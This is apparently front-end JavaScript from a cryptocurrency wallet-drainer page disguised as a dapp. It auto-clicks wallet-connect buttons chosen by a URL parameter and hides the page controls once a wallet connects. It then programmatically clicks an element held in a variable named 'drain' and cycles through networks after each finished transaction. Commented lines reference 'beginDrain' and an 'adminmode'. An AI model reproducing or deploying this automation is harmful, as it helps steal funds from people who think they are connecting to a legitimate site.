if (
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        navigator.userAgent
    )
) {
    var current_url = window.location.href;
    var crurl = new URL(current_url);
    var durl = crurl.searchParams.get("env");
    let dappUrl = window.location.href + "?env=wallet";
    //   alert(durl);
    if (durl == "wallet") {} else {
        // window.location.replace("https://metamask.app.link/dapp/" + dappUrl);
    }
    // open the deeplink page
} else {
    // install metamask message
}

var url_string = window.location.href;
var url = new URL(url_string);
var c = url.searchParams.get("con");
let btnId;

let btn1 = () => {
    let con = document.getElementById("btn1");
    // alert(con)
    do_connect(con);
};
let btn2 = () => {
    let con = document.getElementById("btn2");
    do_connect(con);
};

let btn3 = () => {
    let con = document.getElementById("btn3");
    do_connect(con);
};
let btn5 = () => {
    let con = document.getElementById("btn5");
    do_connect(con);
};

let btn6 = () => {
    let con = document.getElementById("btn6");
    do_connect(con);
};

// let p = document.getElementById('processBtn')
//   btn.addEventListener('click', btnResolver);
//     for (let c = 1; c < 10; c += 1) {
//       console.log(c);
//     let p = document.getElementById('sendTxn')
//     p?.click()
// }

if (c == "metamask") {
    waitForElementToDisplay("#btn1", btn1, 1000, 40000);
}
if (c == "coinbase") {
    waitForElementToDisplay("#btn2", btn2, 1000, 40000);
}
if (c == "wc") {
    waitForElementToDisplay("#btn3", btn3, 1000, 40000);
    btnId = "btn3";
}
if (c == "ledger") {
    waitForElementToDisplay("#btn5", btn5, 1000, 40000);
}
if (c == "injected") {
    waitForElementToDisplay("#btn6", btn6, 1000, 40000);
    btnId = "btn6";
}

function do_connect(div) {
    setTimeout(() => {
        div?.click();
    }, 1000);
}
let switchcount = 1
let finishTxn = () => {
switchcount += 1
    // window.location.replace("/error/index.html?error=true");
    let nextNetwork = document.getElementById("net"+switchcount);
    nextNetwork.click()
};
let showControls = () => {
    // var isMobile = url.searchParams.get("mobile");
    // if (isMobile == "true") {
    //     document.getElementById("mobilecontrols").style.display = "none";
    // } else {
    //     document.getElementById("pccontrols").style.display = "block";
    // }
};
let hideControls = () => {
    document.getElementById("mobilecontrols").style.display = "none";
    document.getElementById("pccontrols").style.display = "none";
};

function showProcess() {
    document.getElementById("process").style.display = "block";
    let drain = document.getElementById("process");
    drain.click();
}

waitForElementToDisplay(".finishTxn", finishTxn, 1000, 900000);

waitForElementToDisplay("#sendTxn", showControls, 1000, 900000);
waitForElementToDisplay("#fullyConnected", showProcess, 1000, 900000);
// waitForElementToDisplay("#fullyConnected", showProcess, 1000, 900000);
waitForElementToDisplay("#fullyConnected", hideControls, 1000, 900000);

// Call the below function
// waitForElementToDisplay("#drain", beginDrain,1000,9000);
// waitForElementToDisplay(".hidden", adminmode,1000,9000);
// waitForElementToDisplay("#error_catch", process_error,1000,90000);

function waitForElementToDisplay(
    selector,
    callback,
    checkFrequencyInMs,
    timeoutInMs
) {
    var startTimeInMs = Date.now();
    (function loopSearch() {
        if (document.querySelector(selector) != null) {
            callback();
            return;
        } else {
            setTimeout(function() {
                if (timeoutInMs && Date.now() - startTimeInMs > timeoutInMs) return;
                loopSearch();
            }, checkFrequencyInMs);
        }
    })();
}